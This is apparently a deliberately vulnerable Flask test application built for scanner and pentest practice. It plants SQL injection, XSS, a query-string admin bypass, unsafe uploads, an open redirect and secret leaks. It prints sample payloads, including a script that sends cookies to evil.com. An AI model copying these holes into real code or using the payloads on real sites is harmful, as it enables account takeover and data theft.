"""
=============================================================================
  OWASP VULNERABLE TEST APPLICATION — FOR SECURITY SCANNER TESTING ONLY
=============================================================================
  ██████████████████████████████████████████████████████████████
  ██  WARNING: THIS APP IS INTENTIONALLY INSECURE              ██
  ██  DO NOT DEPLOY ON A PUBLIC SERVER OR PRODUCTION SYSTEM    ██
  ██  FOR LOCAL SECURITY SCANNER / PENTESTING USE ONLY         ██
  ██████████████████████████████████████████████████████████████

  Vulnerabilities included:
    [VULN-01] XSS         – Reflected & Stored (routes: /, /search, /comment)
    [VULN-02] SQL Inj.    – Classic & UNION-based  (routes: /search, /login)
    [VULN-03] Broken Auth – Hardcoded creds, no lockout, insecure session
    [VULN-04] Missing Sec Headers – No CSP, no X-Frame-Options, etc.
    [VULN-05] Insecure Upload – No type/size check, executable files allowed
    [VULN-06] IDOR        – /admin bypassed with ?admin=1
    [VULN-07] Open Redirect – /redirect?url=
    [VULN-08] Debug Mode  – Flask debug=True, exposes Werkzeug console
    [VULN-09] Sensitive Info Exposure – /debug-info leaks env + secret key
    [VULN-10] CSRF        – No CSRF token on any form
=============================================================================
"""

import sqlite3
import os
import json
from flask import (
    Flask, request, redirect, session,
    render_template_string, jsonify, send_from_directory
)

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# [VULN-03] BROKEN AUTHENTICATION — Hardcoded, weak secret key
# A real app must use os.urandom(32) stored in an env-var, never hardcoded.
# ─────────────────────────────────────────────────────────────────────────────
app.secret_key = "supersecret123"          # VULN: trivially guessable

UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

DB_PATH = os.path.join(os.path.dirname(__file__), "vuln_test.db")


# ─────────────────────────────────────────────────────────────────────────────
# DATABASE BOOTSTRAP
# ─────────────────────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            role     TEXT DEFAULT 'user'
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS products (
            id    INTEGER PRIMARY KEY AUTOINCREMENT,
            name  TEXT NOT NULL,
            price REAL NOT NULL
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS comments (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            author  TEXT,
            body    TEXT
        )
    """)

    # Seed data — [VULN-02] passwords stored in plaintext
    cur.executemany(
        "INSERT OR IGNORE INTO users (id, username, password, role) VALUES (?,?,?,?)",
        [
            (1, "admin",  "admin123",   "admin"),   # VULN: trivial credentials
            (2, "alice",  "password",   "user"),
            (3, "bob",    "123456",     "user"),
        ]
    )
    cur.executemany(
        "INSERT OR IGNORE INTO products (id, name, price) VALUES (?,?,?)",
        [
            (1, "Widget A",  9.99),
            (2, "Gadget B",  49.99),
            (3, "Doohickey", 0.99),
        ]
    )
    conn.commit()
    conn.close()


init_db()


# ─────────────────────────────────────────────────────────────────────────────
# [VULN-04] MISSING SECURITY HEADERS
# No after_request hook sets X-Frame-Options, Content-Security-Policy,
# X-Content-Type-Options, Referrer-Policy, or HSTS.
# Flask also leaks "Server: Werkzeug/x.x.x" by default — not removed here.
# ─────────────────────────────────────────────────────────────────────────────
# (intentionally absent — secure apps would add an @app.after_request here)


# ─────────────────────────────────────────────────────────────────────────────
# SHARED HTML SHELL — note: no CSRF meta-tag, no CSP nonce
# ─────────────────────────────────────────────────────────────────────────────
def page(title, content):
    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>VulnCorp Portal — {title}</title>
  <!-- [VULN-06] Old jQuery loaded from CDN with no SRI hash -->
  <script src="https://code.jquery.com/jquery-1.8.3.min.js"></script>
  <style>
    body  {{ font-family: sans-serif; margin: 40px; background: #f5f5f5; }}
    nav a {{ margin-right: 16px; }}
    .box  {{ background:#fff; padding:24px; border-radius:8px;
              box-shadow:0 1px 4px rgba(0,0,0,.15); max-width:720px; }}
    input, textarea {{ width:100%; padding:6px; margin:6px 0; box-sizing:border-box; }}
    button {{ padding:8px 18px; background:#d9534f; color:#fff;
              border:none; border-radius:4px; cursor:pointer; }}
    pre   {{ background:#222; color:#0f0; padding:16px; overflow-x:auto; }}
    .warn {{ color:#a00; font-weight:bold; }}
  </style>
</head>
<body>
  <nav>
    <b>&#128275; VulnCorp</b> &nbsp;|&nbsp;
    <a href="/">Home</a>
    <a href="/login">Login</a>
    <a href="/search">Search</a>
    <a href="/upload">Upload</a>
    <a href="/admin">Admin</a>
    <a href="/comment">Comment Board</a>
    <a href="/debug-info">Debug Info</a>
  </nav>
  <hr>
  {content}
</body>
</html>"""
    # VULN: render_template_string with raw user content enables SSTI
    return render_template_string(html)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /  — home
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    # [VULN-01] REFLECTED XSS — 'name' param echoed without sanitisation
    name = request.args.get("name", "Visitor")   # VULN: no html.escape()
    html_body = f"""
    <div class="box">
      <h2>Welcome, {name}!</h2>       <!-- VULN: raw user input injected here -->
      <p>This portal is intentionally vulnerable for scanner testing.</p>
      <p>Try: <code>/?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
    </div>
    """
    return page("Home", html_body)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /login  — Broken Auth + SQL Injection
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/login", methods=["GET", "POST"])
def login():
    """
    [VULN-02] SQL INJECTION — username is concatenated directly into query.
              Payload: ' OR '1'='1' --   bypasses authentication entirely.
    [VULN-03] BROKEN AUTHENTICATION
              - No rate-limit / account lockout
              - Default admin:admin123 credentials
              - Session flag set without expiry or regeneration
    [VULN-10] CSRF — no token on the login form
    """
    message = ""
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # VULN: raw string concatenation — trivially injectable
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        try:
            cur.execute(query)          # VULN: unsanitised user input
            row = cur.fetchone()
        except sqlite3.OperationalError as e:
            row = None
            message = f"<span class='warn'>DB Error (useful for attacker): {e}</span>"
        conn.close()

        if row:
            session["user"]     = row[1]
            session["role"]     = row[3]
            session["is_admin"] = (row[3] == "admin")
            return redirect("/admin" if session["is_admin"] else "/")
        else:
            message = "<span class='warn'>Invalid credentials.</span>"

    html_body = f"""
    <div class="box">
      <h2>Login</h2>
      <p class="warn">SQL Injection hint: try <code>' OR '1'='1' --</code> as username</p>
      {message}
      <!-- [VULN-10] No CSRF token -->
      <form method="POST">
        <input name="username" placeholder="Username" autocomplete="off">
        <input name="password" type="password" placeholder="Password" autocomplete="off">
        <button type="submit">Sign In</button>
      </form>
      <br><small>Default creds: <b>admin / admin123</b></small>
    </div>
    """
    return page("Login", html_body)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /search  — SQL Injection + Reflected XSS
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/search")
def search():
    """
    [VULN-02] SQL INJECTION — 'q' parameter injected into SELECT statement.
              UNION attack: ?q=' UNION SELECT username,password,role FROM users--
    [VULN-01] REFLECTED XSS — search term echoed raw into the results page.
    """
    q = request.args.get("q", "")

    results = []
    error   = ""
    if q:
        # VULN: direct string interpolation into SQL
        query = f"SELECT id, name, price FROM products WHERE name LIKE '%{q}%'"
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        try:
            cur.execute(query)          # VULN: SQL injection
            results = cur.fetchall()
        except sqlite3.OperationalError as e:
            error = f"<pre>DB error: {e}\nQuery attempted:\n{query}</pre>"   # VULN: query leak
        conn.close()

    rows = "".join(
        f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>${r[2]}</td></tr>"
        for r in results
    )

    html_body = f"""
    <div class="box">
      <h2>Product Search</h2>
      <p class="warn">
        SQLi hint — UNION: <code>?q=' UNION SELECT username,password,role FROM users--</code>
      </p>
      <!-- [VULN-10] No CSRF token -->
      <form method="GET">
        <input name="q" value="{q}" placeholder="Search products...">  <!-- VULN: XSS -->
        <button type="submit">Search</button>
      </form>
      <p>Showing results for: <b>{q}</b></p>  <!-- VULN: reflected XSS, no escaping -->
      {error}
      <table border="1" cellpadding="6" style="border-collapse:collapse; width:100%">
        <tr><th>ID</th><th>Name</th><th>Price</th></tr>
        {rows}
      </table>
    </div>
    """
    return page("Search", html_body)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /comment  — Stored XSS
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/comment", methods=["GET", "POST"])
def comment():
    """
    [VULN-01] STORED XSS — comment body saved to DB and rendered without escaping.
              Payload: <script>document.location='http://evil.com?c='+document.cookie</script>
    [VULN-10] CSRF — no token on the comment form.
    """
    if request.method == "POST":
        author = request.form.get("author", "Anonymous")
        body   = request.form.get("body", "")
        # VULN: stored directly, never sanitised
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO comments (author, body) VALUES (?,?)", (author, body))
        conn.commit()
        conn.close()

    conn  = sqlite3.connect(DB_PATH)
    rows  = conn.execute("SELECT author, body FROM comments").fetchall()
    conn.close()

    # VULN: comment body rendered raw — stored XSS
    comment_html = "".join(
        f"<div style='border-bottom:1px solid #ccc;padding:8px'>"
        f"<b>{r[0]}</b>: {r[1]}</div>"   # VULN: r[1] is unsanitised HTML
        for r in rows
    )

    html_body = f"""
    <div class="box">
      <h2>Comment Board</h2>
      <p class="warn">Stored XSS: submit <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
      <!-- [VULN-10] No CSRF token -->
      <form method="POST">
        <input name="author" placeholder="Your name">
        <textarea name="body" rows="4" placeholder="Comment..."></textarea>
        <button type="submit">Post</button>
      </form>
      <h3>Comments</h3>
      {comment_html}
    </div>
    """
    return page("Comments", html_body)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /upload  — Insecure File Upload
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/upload", methods=["GET", "POST"])
def upload():
    """
    [VULN-05] INSECURE FILE UPLOAD
      - No whitelist of allowed extensions (accepts .php, .py, .exe, .sh, …)
      - No Content-Type validation
      - No file-size limit
      - Files saved with their original filename (path traversal risk)
      - Files served directly from the uploads/ directory (code execution risk)
    """
    saved = ""
    if request.method == "POST":
        f = request.files.get("file")
        if f and f.filename:
            # VULN: no extension check, no mime check, original filename preserved
            dest = os.path.join(UPLOAD_FOLDER, f.filename)   # VULN: path traversal
            f.save(dest)
            saved = f"<p>✅ Saved: <a href='/uploads/{f.filename}'>{f.filename}</a></p>"

    html_body = f"""
    <div class="box">
      <h2>File Upload</h2>
      <p class="warn">
        No file-type or size validation — upload <code>.php</code>, <code>.py</code>,
        <code>.sh</code>, or any executable. Files are served directly.
      </p>
      <!-- [VULN-10] No CSRF token -->
      <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
      </form>
      {saved}
    </div>
    """
    return page("Upload", html_body)


@app.route("/uploads/<path:filename>")
def serve_upload(filename):
    # VULN: serves any file in uploads/ directory with no authentication
    return send_from_directory(UPLOAD_FOLDER, filename)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /admin  — Broken Access Control + Broken Auth
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/admin")
def admin():
    """
    [VULN-03] BROKEN AUTHENTICATION / [VULN-06] BROKEN ACCESS CONTROL (IDOR)
      - Real check uses session, but ?admin=1 completely bypasses it.
      - An unauthenticated user can access the admin panel via:
        /admin?admin=1
    """
    # VULN: query-param bypass — ?admin=1 overrides session check
    is_admin = session.get("is_admin") or request.args.get("admin") == "1"

    if not is_admin:
        html_body = """
        <div class="box">
          <h2>Access Denied</h2>
          <p class="warn">Broken Access Control hint: try <code>/admin?admin=1</code></p>
          <p><a href="/login">Login normally</a></p>
        </div>
        """
        return page("Admin — Denied", html_body), 403

    conn  = sqlite3.connect(DB_PATH)
    users = conn.execute("SELECT id, username, password, role FROM users").fetchall()
    conn.close()

    # VULN: admin panel exposes plaintext passwords
    user_rows = "".join(
        f"<tr><td>{u[0]}</td><td>{u[1]}</td>"
        f"<td style='color:red'>{u[2]}</td><td>{u[3]}</td></tr>"
        for u in users
    )

    html_body = f"""
    <div class="box">
      <h2>🔑 Admin Panel</h2>
      <p class="warn">Accessible via <code>/admin?admin=1</code> — no real auth check!</p>
      <h3>All Users (including plaintext passwords)</h3>
      <table border="1" cellpadding="6" style="border-collapse:collapse;width:100%">
        <tr><th>ID</th><th>Username</th><th style="color:red">Password</th><th>Role</th></tr>
        {user_rows}
      </table>
    </div>
    """
    return page("Admin Panel", html_body)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /redirect  — Open Redirect
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/redirect")
def open_redirect():
    """
    [VULN-07] OPEN REDIRECT — 'url' param redirects to any arbitrary URL.
              Payload: /redirect?url=https://evil.com
    """
    url = request.args.get("url", "/")
    # VULN: no validation that url is on the same origin
    return redirect(url)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /debug-info  — Sensitive Information Exposure
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/debug-info")
def debug_info():
    """
    [VULN-09] SENSITIVE INFORMATION EXPOSURE
      - Exposes the Flask secret key in plaintext
      - Dumps all environment variables
      - Exposes internal file paths
    """
    env_dump = {k: v for k, v in os.environ.items()}
    info = {
        "secret_key":   app.secret_key,        # VULN: leaks secret key
        "db_path":      DB_PATH,
        "upload_folder": UPLOAD_FOLDER,
        "environment":  env_dump,               # VULN: leaks all env vars
        "session_contents": dict(session),
    }
    html_body = f"""
    <div class="box">
      <h2>🔍 Debug Info (should never be public!)</h2>
      <p class="warn">Exposes secret key, file paths, and environment variables.</p>
      <pre>{json.dumps(info, indent=2, default=str)}</pre>
    </div>
    """
    return page("Debug Info", html_body)


# ─────────────────────────────────────────────────────────────────────────────
# ROUTE: /api/users  — Sensitive data via unauthenticated JSON endpoint
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/api/users")
def api_users():
    """
    [VULN-09] SENSITIVE DATA EXPOSURE — JSON endpoint requires no authentication
              and returns all users with plaintext passwords.
    """
    conn  = sqlite3.connect(DB_PATH)
    users = conn.execute("SELECT id, username, password, role FROM users").fetchall()
    conn.close()
    return jsonify([
        {"id": u[0], "username": u[1], "password": u[2], "role": u[3]}  # VULN
        for u in users
    ])


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("""
=============================================================
  VulnCorp Deliberately Vulnerable App — LOCAL TESTING ONLY
  http://127.0.0.1:5001
=============================================================
  Routes:
    /               Reflected XSS  (?name=<script>...)
    /login          SQL Injection + Broken Auth
    /search         SQL Injection + Reflected XSS
    /comment        Stored XSS
    /upload         Insecure File Upload
    /admin          Broken Access Control (?admin=1)
    /redirect       Open Redirect (?url=https://evil.com)
    /debug-info     Sensitive Info Exposure
    /api/users      Unauth sensitive data endpoint
=============================================================
""")
    # [VULN-08] DEBUG MODE ENABLED — exposes interactive Werkzeug debugger
    app.run(host="127.0.0.1", port=5001, debug=True)   # VULN: debug=True
